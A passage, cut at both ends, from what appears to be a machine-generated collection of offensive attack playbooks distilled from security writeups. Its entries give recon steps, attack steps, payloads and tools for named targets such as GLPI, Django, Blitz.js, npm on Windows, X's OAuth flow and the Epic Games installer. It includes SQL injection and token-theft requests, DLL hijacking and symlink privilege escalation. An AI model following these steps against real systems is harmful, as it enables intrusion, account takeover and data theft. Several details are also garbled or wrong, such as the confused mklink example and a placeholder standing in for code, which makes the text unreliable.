Step 3: Monitor for signs of successful code execution or system crash.
payloads_or_patterns: Malicious RPC calls designed to exploit improper handling of NFSv4 requests. Specific payload structure depends on the exact vulnerability details (buffer overflow in response size calculation). The writeup mentions the vulnerability is due to `Nfs4SvrXdrpGetEncodeOperationResultByteCount()` not including the opcode size, leading to a buffer overflow. A crafted request would need to trigger this specific calculation error.
tools_recommended: Nmap (for port scanning and service detection)
Custom RPC client or exploit framework (e.g., Metasploit, if an exploit module exists) capable of crafting specific ONC RPC messages for NFSv4.
success_indicators: Arbitrary code execution in the context of SYSTEM.
Confirmed shell or command execution on the target system.
Unsuccessful exploitation may result in a crash of the target system (which could also be a sign of an attempt, though not successful exploitation).
failure_indicators: No response or unexpected responses from the target.
Target system remains stable and shows no signs of compromise.
Firewall blocking RPC traffic.
Successful exploitation requires specific crafted RPC packets that may be blocked by an Intrusion Prevention System (IPS).

playbooks.impact: An unauthenticated attacker can execute arbitrary code on the target system with SYSTEM privileges, leading to full compromise of the machine.
playbooks.key_lesson: Investigate network file sharing protocols (like NFS) for improper handling of RPC messages and buffer management, especially when interacting with different protocol versions (e.g., NFSv4).

meta.title: Uncovering a macOS App Sandbox escape vulnerability: A deep dive into CVE-2022-26706

trigger_conditions.when_to_apply: This vulnerability is applicable when an attacker can execute specially crafted code on a macOS system that is vulnerable to CVE-2022-26706.
prerequisites: The target macOS system must be running a version vulnerable to CVE-2022-26706 and have not yet received the security update from May 16, 2022.
applicability_signals: insufficient detail in writeup
skip_if: The macOS system has been updated to include the fix for CVE-2022-26706.

recon_steps: Step 1: Identify the macOS version running on the target system to determine if it's vulnerable to CVE-2022-26706.
attack_steps: Step 1: Craft a malicious application or code snippet designed to exploit the CVE-2022-26706 vulnerability.
Step 2: Execute the crafted code on the vulnerable macOS system.
Step 3: Observe if the code successfully escapes the App Sandbox and gains unrestricted access.
tools_recommended: insufficient detail in writeup
success_indicators: The crafted code can perform actions outside of the App Sandbox restrictions, such as accessing files or system resources that should be protected.
failure_indicators: The crafted code is confined by the App Sandbox and cannot access restricted resources. This indicates the patch is likely in place or the exploit technique is ineffective.
If the macOS system crashes or exhibits unexpected behavior, it might indicate a failed exploit attempt or instability caused by the malicious code.

playbooks.impact: Allows specially crafted code to escape the macOS App Sandbox, granting unrestricted access to the system and potentially leading to further compromise, data theft, or privilege escalation.
playbooks.key_lesson: Always verify if system software, especially operating systems, has applied the latest security patches to mitigate known vulnerabilities like sandbox escapes.

meta.title: Netwrix Auditor Advisory - Potential Insecure Deserialization

trigger_conditions.when_to_apply: When Netwrix Auditor processes serialized data from untrusted sources without proper validation.
prerequisites: The target system must be running Netwrix Auditor.
applicability_signals: The writeup mentions the possibility of insecure deserialization, indicating that certain data handling mechanisms might be vulnerable.
skip_if: The application explicitly validates all incoming serialized data for integrity and authenticity before deserialization.

recon_steps: Step 1: Analyze network traffic and application logs for any instances of serialized data being transmitted or processed by Netwrix Auditor.
Step 2: Identify specific endpoints or functions that handle data that could potentially be serialized (e.g., configuration files, user input, API responses).
attack_steps: Step 1: Craft a malicious serialized object designed to trigger arbitrary code execution upon deserialization.
Step 2: Submit the malicious serialized object to the identified vulnerable endpoint or function within Netwrix Auditor.
Step 3: Monitor the target system for any signs of code execution or anomalous behavior.
payloads_or_patterns: Insufficient detail in writeup. Requires custom Java/C# gadget chains or similar for common serialization libraries (e.g., Apache Commons Collections, Log4j).
tools_recommended: ysoserial (for generating Java deserialization payloads)
Burp Suite (for intercepting and modifying requests)
Custom scripts for crafting and sending serialized data.
success_indicators: Arbitrary code execution on the target server.
Unexpected process creation or modification on the target system.
Callback to an attacker-controlled server (e.g., via reverse shell).
failure_indicators: Deserialization errors without code execution.
Application crashes or instability without signs of attacker control.
4xx or 5xx error codes indicating the request was rejected before deserialization.
No observable changes on the target system after submitting the payload.

playbooks.impact: Remote Code Execution (RCE) on the Netwrix Auditor server, allowing an attacker to gain full control of the system, access sensitive data, and potentially pivot to other systems within the network.
playbooks.key_lesson: When interacting with applications that handle serialized data, always ensure that deserialization is performed safely and that input is validated to prevent arbitrary code execution.

meta.title: Leveraging the SQL Injection to Execute the XSS by Evading CSP

trigger_conditions.when_to_apply: When a web application is vulnerable to SQL injection in a parameter that is reflected in the HTML response and is also subject to Content Security Policy (CSP) restrictions.
prerequisites: Target application is vulnerable to SQL injection in a reflected parameter.
Target application has a CSP implemented.
applicability_signals: Observable SQL injection vulnerability.
Response content includes reflected user input.
CSP headers are present in the HTTP response.
skip_if: No SQL injection vulnerability found.
No CSP headers are present.
Reflected input is strictly sanitized or encoded in a way that prevents XSS, even after SQL injection.

recon_steps: Step 1: Identify parameters vulnerable to SQL injection via fuzzing or manual testing.
Step 2: Observe the response to confirm if the injected payload is reflected in the HTML output.
Step 3: Analyze the Content-Security-Policy header to understand the restrictions in place.
attack_steps: Step 1: Craft an SQL injection payload that, in addition to extracting data or causing an error, also injects a script tag or event handler.

Step 2: Attempt to bypass CSP by using techniques such as injecting trusted domains (if possible via SQL injection), using nonces (if an injection point for them exists), or leveraging specific browser/CSP interpretation quirks.
Step 3: Execute the crafted payload via the identified vulnerable parameter.
Step 4: Monitor for the execution of injected JavaScript.
payloads_or_patterns: Example SQLi payload to trigger XSS: `'; INSERT INTO table_name (column_name) VALUES ('<script>alert(1)</script>'); --` (This is a conceptual example; actual payload depends heavily on the SQL dialect and injection point. The goal is to insert JS code that bypasses CSP.)

Example CSP bypass strategy: Injecting `script-src 'self' <evil.com>` if the SQL injection allows modification of the CSP header itself, or using inline event handlers if `script-src 'unsafe-inline'` is permitted or can be bypassed.
tools_recommended: sqlmap: For identifying and exploiting SQL injection vulnerabilities.
Burp Suite: For intercepting, analyzing, and modifying HTTP requests/responses, and for fuzzing.
Browser Developer Tools: To inspect CSP headers and observe script execution.
success_indicators: Execution of JavaScript code (e.g., an alert box appears).
A request is sent from the victim's browser to an attacker-controlled server.
Sensitive data is exfiltrated as a result of the injected script.
failure_indicators: SQL injection vulnerability doesn't lead to reflected XSS, even with bypass attempts (e.g., proper output encoding is applied).
CSP strictly forbids inline scripts and event handlers, and no trusted sources can be injected via SQLi.
Server returns a 4xx or 5xx error that prevents the payload from being processed or reflected.
No observable JavaScript execution or callback.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session, potentially leading to session hijacking, data theft, phishing, or further exploitation by bypassing CSP.
playbooks.key_lesson: When a SQL injection vulnerability exists in a reflected parameter and CSP is present, investigate if the injected SQL can be used to inject executable JavaScript that evades CSP restrictions.

meta.title: CVE-2022-32223 Discovery: DLL Hijacking via npm CLI

trigger_conditions.when_to_apply: When Node.js versions earlier than 16.16.0 (LTS) and 14.20.0 are in use on a Windows system, and OpenSSL is installed.
prerequisites: Target is running Windows.
Target has Node.js installed (vulnerable versions: < 16.16.0, < 14.20.0).
OpenSSL is installed on the target system.
Attacker has write access to the current working directory from which the `npm` command will be executed.
applicability_signals: Execution of `npm` command triggers `node.exe` to search for `providers.dll` (observable via Process Monitor).
The `providers.dll` does not exist in any standard system paths.
skip_if: Target is not running Windows.
Target is running patched Node.js versions (>= 16.16.0 or >= 14.20.0).
Attacker cannot write to the current working directory of the `npm` command execution.

recon_steps: Step 1: Identify if the target system is running Windows.
Step 2: Identify the Node.js and npm versions installed on the target.
Step 3: Check if OpenSSL is installed on the target system.
attack_steps: Step 1: Create a malicious DLL file named `providers.dll`. This DLL should contain code to execute arbitrary commands (e.g., open `calc.exe`).
Step 2: Place the malicious `providers.dll` file in the directory where the attacker intends to execute an `npm` command.
Step 3: Execute a common `npm` command (e.g., `npm --version` or `npm install`) from the same directory containing the malicious DLL.
Step 4: Observe if the code within the malicious `providers.dll` is executed.
payloads_or_patterns: content of a malicious providers.dll (example opens calc.exe): [C++ code snippet for DLL implementation]
tools_recommended: Process Monitor (Sysinternals) to observe file access (e.g., `node.exe` searching for `providers.dll`).
A C++ compiler (e.g., MSVC) to compile the malicious DLL.
A tool or method to gain write access to the target's file system in a location that `npm` commands might be executed from.
success_indicators: Arbitrary code execution (e.g., `calc.exe` opens) when an `npm` command is run from the directory containing the malicious `providers.dll`.
Process Monitor logs showing `node.exe` loading `providers.dll`.
failure_indicators: No arbitrary code execution occurs when `npm` command is run.
Process Monitor does not show `node.exe` attempting to load `providers.dll`.

This might indicate a patched Node.js version, absence of OpenSSL, or the attacker not being able to place the DLL in the correct location (e.g., the directory is not the current working directory for the `npm` command).

playbooks.impact: Remote Code Execution (RCE) or Privilege Escalation on the target Windows system, depending on the privileges under which `node.exe` is run. Persistence can be established.
playbooks.key_lesson: On Windows, always assume that applications loading DLLs without a fully qualified path might be vulnerable to DLL hijacking if an attacker can control a directory in the DLL search order, especially the current working directory.

meta.title: How a Simple IDOR Led Me to Delete Any Account

tech_stack_fingerprints: Cloudflare DDoS protection (observable via HTTP headers or HTML)

trigger_conditions.when_to_apply: When an authenticated user can access functionality that uses an identifier to perform an action on a specific resource (e.g., deletion), and that identifier is predictable or enumerable.
prerequisites: Attacker must have an authenticated session.
applicability_signals: API endpoints or requests that perform sensitive actions and include user-specific identifiers (e.g., account IDs, resource IDs) in the request body or URL.
skip_if: All requests are protected by CSRF tokens and cannot be replayed without a valid token. The identifier used is not predictable or enumerable.

recon_steps: Step 1: Intercept and analyze requests for account deletion functionality using a web proxy (e.g., Burp Suite).
Step 2: Identify the parameter used to identify the account to be deleted (e.g., account ID, user ID).
attack_steps: Step 1: Log in to the application with one user account.
Step 2: Initiate the account deletion process and capture the request.
Step 3: Observe the request for any identifier that specifies the account to be deleted (e.g., `userId=12345`).
Step 4: Log in to the application with a *different* user account.
Step 5: Replay the captured deletion request, but modify the identifier to point to the *other* user's account.
Step 6: Observe the response to confirm if the account of the other user was deleted.
payloads_or_patterns: Modify the `userId` parameter in the deletion request to an arbitrary or observed user ID from another account.
tools_recommended: Burp Suite (or similar proxy) for request interception and modification.
success_indicators: The target account is successfully deleted without the attacker's session being associated with that account.
A success message is returned by the server indicating the account deletion.
The deleted account can no longer log in or access resources.
failure_indicators: A 403 Forbidden error is received, indicating authorization checks are in place.
A 400 Bad Request error is received, suggesting an invalid identifier or payload.
The request fails with an error indicating the account does not exist or cannot be found.
If a 403 occurs, try enumerating other potential ID formats (e.g., UUIDs instead of integers).

playbooks.impact: An attacker can delete any user account on the platform, leading to data loss and denial of service for affected users.
playbooks.key_lesson: Always verify that sensitive operations (like deletion) are strictly tied to the authenticated user's own resources and are not vulnerable to parameter manipulation that allows access to other users' data or actions.

meta.title: Remote Code Execution via Prototype Pollution in Blitz.js

trigger_conditions.when_to_apply: When a Blitz.js application parses user-controlled input without proper sanitization, leading to prototype pollution.
prerequisites: Target application uses Blitz.js.
applicability_signals: Observation of nested objects in request parameters being merged/parsed without deep cloning.
Vulnerable versions of Blitz.js or dependencies.
skip_if: The application explicitly sanitizes all incoming nested parameters.
No Blitz.js framework identified.

recon_steps: Step 1: Identify if the target application is using Blitz.js via framework detection tools or response headers.
Step 2: Analyze the request parsing mechanisms of the target application for potential prototype pollution vulnerabilities, specifically looking for uncontrolled merging of nested objects.
attack_steps: Step 1: Send a POST request to a relevant endpoint (e.g., an API route or form submission handler) with a payload designed to trigger prototype pollution.

Step 2: The payload should aim to modify the '__proto__' object, for example, by sending a nested JSON object like `{"__proto__": {"isAdmin": true}}` or similar structures depending on how the data is processed.

Step 3: If prototype pollution is successful, attempt to leverage the polluted prototype to achieve Remote Code Execution (RCE) by chaining it with other vulnerabilities or by exploiting specific functionalities that are affected by the prototype modification (e.g., deserialization, class constructor calls).
tools_recommended: Burp Suite: To intercept and modify requests, especially for fuzzing parameters.
Custom scripts (e.g., Python with `requests` library): For automated testing of multiple endpoints and payloads.
success_indicators: Response indicating elevated privileges (e.g., access to admin panels, modified user roles).
Execution of arbitrary code on the server, observable via logs, callbacks, or specific application behavior changes.
A response containing the injected property, e.g., `isAdmin: true`.
failure_indicators: 4xx or 5xx errors indicating invalid payload structure or server-side validation blocking the pollution.
No observable change in application behavior or privileges. Suggestion: Try different payload structures or investigate other parsing mechanisms.

playbooks.impact: An attacker can gain administrative privileges, execute arbitrary code on the server, leading to full system compromise and data exfiltration.
playbooks.key_lesson: Always sanitize or deeply clone nested user-controlled input when parsing requests to prevent prototype pollution vulnerabilities.

meta.title: GLPI Service Management Software Multiple Vulnerabilities and Remote Code Execution

trigger_conditions.when_to_apply: When the target is GLPI and the helpdesk module has file upload enabled, and unauthenticated users can access it. This exploit targets the handling of the '_actors' parameter in the change form.
prerequisites: Target is GLPI Service Management Software.
Helpdesk module is enabled and accessible.
File upload feature is available.
applicability_signals: Presence of /front/change.form.php endpoint.
GLPI application behavior related to ticket/change creation and file uploads.
The application processes POST requests to /front/change.form.php.
skip_if: Helpdesk module is disabled or requires authentication.
File upload functionality is not present or restricted.

recon_steps: Step 1: Fingerprint the target to confirm it is running GLPI.
Step 2: Identify if the helpdesk module is accessible and if file uploads are permitted.
attack_steps: Step 1: Send a POST request to `/front/change.form.php` with `multipart/form-data` content type.
Step 2: Include a parameter `id` with a value of `0`.
Step 3: Include a parameter `_actors` containing a JSON string that is crafted to exploit SQL injection. The JSON structure should mimic valid data but include SQLi payloads within its values.
Step 4: Observe the response for signs of SQL injection success.
payloads_or_patterns:
POST /front/change.form.php HTTP/1.1
Host: <TARGET_URL>
Content-Type: multipart/form-data; boundary=--------------------------

----------------------------
Content-Disposition: form-data; name="id"

0
----------------------------
Content-Disposition: form-data; name="_actors"

{"user_id":"1' OR '1'='1"}
----------------------------
tools_recommended: Burp Suite: To craft and send the multipart/form-data POST request with the malicious `_actors` payload.
success_indicators: The response contains SQL error messages.
The response reflects the injected SQL query's impact (e.g., unexpected data or behavior).
A successful SQL injection leading to data leakage or manipulation.
failure_indicators: A generic error message or a 400 Bad Request response indicating malformed input. Pivot by trying different JSON structures for `_actors` or testing other parameters for SQLi.
A 403 Forbidden response suggests WAF interference. Pivot by attempting to bypass WAF rules.

playbooks.impact: Successful SQL injection can lead to unauthorized data access, modification, or deletion within the GLPI application. Depending on the extent of the injection, this could include sensitive user information, ticket data, or system configurations.
playbooks.key_lesson: Always meticulously analyze how raw POST and GET parameters, especially those in JSON format, are handled before they are sanitized. Look for unescaped global variables in PHP files that process user input, as these are prime candidates for injection vulnerabilities.

meta.title: Account hijacking using "dirty dancing" in sign-in OAuth-flows

affected_components: Sign-in flows using third-party OAuth providers
tech_stack_fingerprints: Presence of 'Sign in with [Provider]' buttons (e.g., Google, Facebook, Apple)
HTTP requests containing `response_type`, `client_id`, `redirect_uri`, `state`, `response_mode` parameters during OAuth flows

trigger_conditions.when_to_apply: This technique is applicable when a web application utilizes OAuth for user authentication with third-party providers and exhibits certain misconfigurations or vulnerabilities in handling OAuth parameters, especially when combined with client-side JavaScript.
prerequisites: The target application must integrate with a third-party OAuth provider.
The attacker must be able to intercept or manipulate redirect URIs and OAuth parameters.
In some scenarios, the attacker might need to control a domain that can host malicious JavaScript or trigger specific redirect behaviors.
applicability_signals: The presence of OAuth redirect URIs that are not strictly validated.
The use of `response_type=token` or `response_type=code` with `response_mode=fragment`.
Client-side JavaScript involved in the OAuth flow that can be influenced or injected.
The target application might use less secure OAuth configurations or outdated libraries.
skip_if: All OAuth redirect URIs are strictly validated against a predefined list and do not allow for wildcard matching or ambiguous matching.
The application exclusively uses server-side handling of OAuth codes and tokens, preventing client-side manipulation.
Strong security measures like Proof Key for Code Exchange (PKCE) are implemented and enforced.
All OAuth responses are handled on the server-side and tokens are not exposed to the client's URL fragment or query parameters.

recon_steps: Step 1: Identify all OAuth integration points on the target application. Look for 'Sign in with X' buttons and analyze the network requests made during the OAuth flow.

Step 2: Examine the OAuth request parameters, specifically `client_id`, `redirect_uri`, `response_type`, `response_mode`, and `state`. Note any suspicious patterns or lack of strict validation on these parameters.
Step 3: If client-side JavaScript is involved in the OAuth process, investigate its behavior for potential manipulation points.
attack_steps: Step 1: Initiate the OAuth flow by clicking a 'Sign in with [Provider]' button.
Step 2: Manipulate the `redirect_uri` parameter to point to an attacker-controlled domain or a subdomain that the target application might misinterpret as legitimate.

Step 3: Experiment with different `response_type` and `response_mode` combinations. For example, try using `response_type=token` with `response_mode=fragment` to capture tokens directly in the URL fragment.
Step 4: If `state` validation is weak or absent, attempt to manipulate it to potentially desynchronize the flow or inject malicious data.

Step 5: If the application allows third-party JavaScript inclusion or if XSS is possible within the OAuth callback, attempt to inject JavaScript to steal the token or authorization code from the URL fragment or query parameters.
Step 6: Once a token or authorization code is exfiltrated, use it to authenticate as the victim user on the target application.
payloads_or_patterns: JavaScript payload to capture query parameters: `new URLSearchParams(window.location.search)`
tools_recommended: Burp Suite: To intercept and modify HTTP requests, analyze OAuth parameters, and observe responses.
Browser Developer Tools: To inspect network traffic, JavaScript execution, and URL fragments/query parameters.
Custom script: For automating the manipulation of OAuth parameters and redirect URIs.
success_indicators: Receiving an OAuth token or authorization code in the `fragment` or `query` part of the redirect URI to an attacker-controlled endpoint.
Successfully logging into the target application as another user using the exfiltrated token or code.
Observing sensitive user data in the response after using the stolen token/code.
failure_indicators: Receiving an error from the OAuth provider or the target application indicating an invalid `redirect_uri` or state mismatch.
The OAuth flow completes without exposing any sensitive tokens or codes in the redirect URL.
A 400 Bad Request or similar error response from the server if parameters are malformed.

playbooks.impact: Account takeover of legitimate users, enabling unauthorized access to their data, profile information, and potentially performing actions on their behalf within the target application.
playbooks.key_lesson: Always strictly validate all OAuth parameters, especially `redirect_uri` and `state`, against an allowlist of known and trusted values. Avoid `response_mode=fragment` when `response_type=token` is used, and prioritize server-side handling of authorization codes and tokens.

meta.title: PoC video

trigger_conditions.when_to_apply: When an OAuth authentication flow is observed and there's an opportunity to manipulate the authorization code or access token exchange.
prerequisites: The target must have an OAuth application integration or allow third-party logins via OAuth.
applicability_signals: Observing the OAuth authorization redirect flow.
skip_if: The OAuth flow strictly validates the `state` parameter or uses PKCE without allowing its manipulation.

recon_steps: Step 1: Browse X (formerly Twitter) and identify any third-party integrations or login options that use OAuth.
Step 2: Initiate the OAuth login flow for a chosen third-party application to observe the redirect URLs and parameters, especially `client_id`, `redirect_uri`, and `state`.
attack_steps: Step 1: Initiate OAuth flow from a victim's browser to a malicious app.
Step 2: Intercept the authorization code returned by X after user grants permission.
Step 3: Use the stolen authorization code to request an access token from X's token endpoint, specifying the `redirect_uri` of a *different*, attacker-controlled application.

Step 4: If X's backend trusts the `redirect_uri` provided during the token exchange and does not re-validate it against the original authorization request, the attacker will receive the victim's access token.
payloads_or_patterns:
POST /oauth/token HTTP/1.1
Host: api.twitter.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=<STOLEN_AUTH_CODE>&redirect_uri=<ATTACKER_CONTROLLED_REDIRECT_URI>&client_id=<VICTIM_APP_CLIENT_ID>
tools_recommended: Burp Suite: To intercept and modify HTTP requests during the OAuth flow, particularly the token exchange.
success_indicators: Receiving a valid access token for the victim's account from X's token endpoint, even when the `redirect_uri` in the token request differs from the one in the initial authorization request.
failure_indicators: X's token endpoint returns an error indicating a mismatch in `redirect_uri` or invalid authorization code → The vulnerability likely requires a stricter validation of the `redirect_uri` at the token exchange stage, or the `state` parameter was used effectively to prevent this.

playbooks.impact: Account takeover of the victim's X (formerly Twitter) account.
playbooks.key_lesson: Always validate the `redirect_uri` during the OAuth token exchange against the `redirect_uri` provided during the initial authorization request to prevent OAuth Dirty Dancing attacks.

meta.title: CVE-2022-34265 - Django SQL Injection in Trunc and Extract functions

tech_stack_fingerprints: Django framework detected via typical file paths (e.g., settings.py, urls.py) or specific response headers if present.
Presence of database query logs indicating the use of Trunc or Extract functions.

trigger_conditions.when_to_apply: This vulnerability is applicable when the target Django application uses the `Trunc` or `Extract` database functions with user-controlled input in the `kind` or `lookup_name` arguments respectively.
prerequisites: The target must be running a vulnerable version of Django (3.2.x < 3.2.14 or 4.0.x < 4.0.6).
The attacker must be able to make authenticated requests to endpoints that utilize these functions.
applicability_signals: Endpoints that perform date/time manipulations or aggregations.
API parameters that seem to control date truncation or extraction logic.
Django ORM queries that explicitly use `Trunc` or `Extract`.
skip_if: Target is running a patched version of Django.
No user-controllable input is passed to the `Trunc` or `Extract` functions.

recon_steps: Step 1: Identify API endpoints that perform date-related operations or aggregations using Django's ORM.
Step 2: Analyze requests to these endpoints to find parameters that might control date truncation or extraction logic (e.g., `kind`, `lookup_name`).
attack_steps: Step 1: Craft a request to an identified endpoint, providing a malicious string in the `kind` or `lookup_name` parameter.
Step 2: For example, use `SELECT 1 FROM pg_sleep(5)` (PostgreSQL) or similar time-based SQL commands.
Step 3: Observe the response time to detect delays indicative of successful SQL execution.
tools_recommended: Burp Suite: To intercept and modify requests, and analyze response times.
SQLMap: Potentially useful for automating detection and exploitation if the vulnerable endpoint can be identified.
success_indicators: A significant delay in the response time (e.g., >5 seconds) when injecting a time-based SQL payload.
Error messages containing SQL syntax errors that can be correlated with the injected payload.
If blind SQL injection is successful, subsequent exploitation for data exfiltration can be attempted.
failure_indicators: No delay observed in response time, or a consistent error response regardless of the payload. This might indicate input sanitization or a different vulnerability class. Pivot to fuzzing other parameters.
400 Bad Request or 403 Forbidden responses that are not directly related to the injected SQL. This could be due to input validation or WAFs. Try encoding or alternative injection points.

playbooks.impact: Arbitrary SQL code execution, allowing attackers to access, modify, or delete data in the database. This can lead to sensitive data leakage, complete system compromise, or denial of service.
playbooks.key_lesson: Always scrutinize user-controlled input passed to database functions, especially those related to date/time manipulation, as improper sanitization can lead to SQL injection vulnerabilities.

meta.title: Rediscovering Epic Games 0-Days (Forever Unpatched?)

tech_stack_fingerprints: Executable MSI file located in C:\Windows\Installer
File operations performed by SYSTEM user during MSI repair/install
Permissive ACLs on C:\Program Files (x86)\Epic Games\Launcher\

trigger_conditions.when_to_apply: When an installer (like Epic Games Launcher MSI) performs file operations (copy, delete, overwrite) during repair or installation, and there are user-writable locations or locations with permissive ACLs that can be leveraged for symbolic link redirection.
prerequisites: Ability to execute the Epic Games Launcher MSI repair process.
The target system has the Epic Games Launcher installed.
The attacker has write access to a directory or the target directory has weak ACLs that allow modification.
applicability_signals: ProcMon logs showing CreateFile or Load Image operations on files within the Epic Games Launcher installation directory during the repair process.
Analysis of file permissions (ACLs) on the Epic Games Launcher directory showing it's user-writable or has permissive permissions.
skip_if: ProcMon shows no file operations during MSI repair.
All file operations by the installer are on read-only system directories with strict ACLs.
The installer does not execute with SYSTEM privileges.

recon_steps: Step 1: Install Epic Games Launcher and locate its MSI installer in C:\Windows\Installer.

Step 2: Use ProcMon to monitor file operations during the MSI 'Repair' process, focusing on CreateFile and Load Image events. Filter for operations by the SYSTEM user and target the Epic Games Launcher installation directory.

Step 3: Analyze ACLs on the Epic Games Launcher installation directory (e.g., C:\Program Files (x86)\Epic Games\Launcher\) using `icacls` to identify any permissive permissions for non-privileged users.
attack_steps: Step 1: Create a symbolic link in a user-writable location (or a location with permissive ACLs) that points to a critical system file that the Epic Games Launcher installer is known to overwrite during repair. For example, if the installer overwrites 'C:\Program Files (x86)\Epic Games\Launcher\SomeFile.dll', create a symlink in a user-controlled directory like 'C:\Users\<attacker>\Desktop\SomeFile.dll' that points to a malicious DLL.
Step 2: Initiate the MSI repair process for the Epic Games Launcher.
Step 3: Observe ProcMon logs for the file overwrite operation. The installer, attempting to 'repair' 'SomeFile.dll', will instead write to the location specified by the symlink.
payloads_or_patterns: Create symbolic link command: `mklink <attacker_controlled_path>\<target_file> <original_file_path>` (e.g., `mklink C:\Users\<user>\Desktop\EpicOverlay.dll "C:\Program Files (x86)\Epic Games\Launcher\EpicOverlay.dll"` where `C:\Users\<user>\Desktop\EpicOverlay.dll` is a malicious DLL).
Target file for overwrite: Identified by ProcMon during MSI repair (e.g., a DLL or configuration file within the Epic Games installation directory).
tools_recommended: ProcMon: For detailed file system activity monitoring during MSI repair.
Sysinternals Suite (mklink): For creating symbolic links.
icacls: For analyzing and manipulating file permissions (ACLs).
success_indicators: ProcMon confirms that the Epic Games Launcher installer writes to the attacker-controlled symlink destination.
If the overwritten file is a DLL that gets loaded by the launcher or a related process, successful execution of attacker-controlled code (e.g., spawning `calc.exe` or a reverse shell) confirms LPE.
failure_indicators: Installer fails to initiate repair or logs errors indicating it cannot access the target file.
Installer writes to the original file path instead of the symlink destination, indicating the symlink was not correctly created or respected.
Overwritten file does not result in code execution, suggesting the overwritten file is not loaded or executed in a privileged context.

playbooks.impact: Local Privilege Escalation (LPE) to SYSTEM by overwriting a critical executable or DLL used by the Epic Games Launcher with attacker-controlled code.
playbooks.key_lesson: When analyzing installers (MSI, EXE) for vulnerabilities, always monitor file operations with ProcMon and investigate ACLs on installation directories for potential symbolic link abuse for LPE.

meta.title: We Hacked Larksuite For 1 month and Here is what we found

trigger_conditions.when_to_apply: When the target is a collaborative platform with file management and sharing features and implements RBAC.
prerequisites: Attacker has an authenticated session.
applicability_signals: Target offers file uploading, sharing, and versioning.
Target has role-based access controls implemented.

recon_steps: Step 1: Explore Larksuite's functionalities, focusing on file management, sharing, and user roles.
Step 2: Identify API endpoints or parameters related to file access, modification, or sharing.
